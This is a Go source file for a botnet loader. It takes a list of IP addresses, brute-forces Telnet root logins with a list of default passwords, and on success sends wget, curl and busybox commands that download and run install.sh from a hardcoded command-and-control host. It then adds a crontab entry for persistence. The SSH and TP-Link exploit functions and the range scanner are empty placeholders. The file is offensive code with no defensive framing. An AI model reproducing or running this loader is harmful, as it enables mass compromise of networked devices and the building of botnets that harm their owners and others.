package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

var (
	C2_HOST = "85.11.167.41"
	C2_PORT = 1337
	HTTP_PORT = 8080
	PAYLOAD_URL = fmt.Sprintf("http://%s:%d/install.sh", C2_HOST, HTTP_PORT)
	THREADS = 50
	TIMEOUT = 5
)

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run loader.go ips.txt")
		fmt.Println("   or: go run loader.go 192.168.1.0/24")
		os.Exit(1)
	}

	var targets []string
	arg := os.Args[1]

	if strings.HasSuffix(arg, ".txt") {
		targets = loadIPs(arg)
	} else if strings.Contains(arg, "/") {
		targets = scanRange(arg)
	} else {
		targets = []string{arg}
	}

	if len(targets) == 0 {
		fmt.Println("[!] No targets found")
		os.Exit(1)
	}

	fmt.Printf("[*] Loaded %d targets\n", len(targets))
	fmt.Printf("[*] Using %d threads\n", THREADS)
	fmt.Println("")

	var wg sync.WaitGroup
	exploited := 0
	var mu sync.Mutex

	sem := make(chan struct{}, THREADS)

	for _, ip := range targets {
		wg.Add(1)
		sem <- struct{}{}
		go func(ip string) {
			defer wg.Done()
			defer func() { <-sem }()

			if tryExploit(ip) {
				mu.Lock()
				exploited++
				mu.Unlock()
			}
		}(ip)
	}

	wg.Wait()

	fmt.Println("")
	fmt.Printf("[+] Complete! Exploited %d/%d devices\n", exploited, len(targets))
}

func loadIPs(filename string) []string {
	var ips []string
	file, err := os.Open(filename)
	if err != nil {
		return ips
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			ips = append(ips, line)
		}
	}
	return ips
}

func scanRange(cidr string) []string {
	var ips []string
	// Simple range - just return placeholder
	// Full implementation would parse CIDR
	return ips
}

func portOpen(ip string, port int) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), time.Duration(TIMEOUT)*time.Second)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func tryExploit(ip string) bool {
	fmt.Printf("[*] Trying %s\n", ip)

	// Check common ports
	ports := []int{23, 22, 80, 443, 6379}
	open := false
	for _, p := range ports {
		if portOpen(ip, p) {
			open = true
			break
		}
	}

	if !open {
		return false
	}

	// Try Telnet
	if portOpen(ip, 23) {
		if exploitTelnet(ip) {
			fmt.Printf("[+] Exploited %s via Telnet\n", ip)
			return true
		}
	}

	// Try SSH
	if portOpen(ip, 22) {
		if exploitSSH(ip) {
			fmt.Printf("[+] Exploited %s via SSH\n", ip)
			return true
		}
	}

	// Try TP-Link
	if portOpen(ip, 80) || portOpen(ip, 443) {
		if exploitTPLink(ip) {
			fmt.Printf("[+] Exploited %s via TP-Link\n", ip)
			return true
		}
	}

	return false
}

func exploitTelnet(ip string) bool {
	passwords := []string{
		"root", "admin", "password", "123456", "toor", "root123",
		"admin123", "user", "guest", "letmein", "qwerty", "passw0rd",
		"raspberry", "pi", "ubuntu", "alpine", "default",
	}

	for _, pass := range passwords {
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:23", ip), time.Duration(TIMEOUT)*time.Second)
		if err != nil {
			continue
		}
		defer conn.Close()

		conn.SetDeadline(time.Now().Add(time.Duration(TIMEOUT) * time.Second))

		// Simple telnet login attempt
		buf := make([]byte, 1024)
		conn.Read(buf)

		conn.Write([]byte("root\n"))
		time.Sleep(500 * time.Millisecond)
		conn.Read(buf)

		conn.Write([]byte(pass + "\n"))
		time.Sleep(500 * time.Millisecond)

		n, _ := conn.Read(buf)
		resp := string(buf[:n])

		if strings.Contains(resp, "#") || strings.Contains(resp, "$") || strings.Contains(resp, ">") {
			// Send payload
			payloads := []string{
				fmt.Sprintf("wget -q %s -O /tmp/install.sh; sh /tmp/install.sh\n", PAYLOAD_URL),
				fmt.Sprintf("curl -s %s -o /tmp/install.sh; sh /tmp/install.sh\n", PAYLOAD_URL),
				fmt.Sprintf("busybox wget -q %s -O /tmp/install.sh; sh /tmp/install.sh\n", PAYLOAD_URL),
				fmt.Sprintf("echo '*/5 * * * * root wget -q %s -O /tmp/install.sh && sh /tmp/install.sh' >> /etc/crontab\n", PAYLOAD_URL),
			}
			for _, p := range payloads {
				conn.Write([]byte(p))
				time.Sleep(300 * time.Millisecond)
			}
			return true
		}
	}
	return false
}

func exploitSSH(ip string) bool {
	// SSH exploit placeholder - requires paramiko or similar
	// For Go, would need to use ssh package or call external script
	return false
}

func exploitTPLink(ip string) bool {
	// TP-Link exploit placeholder
	// Would implement HTTP request to /cgi-bin/luci/
	return false
}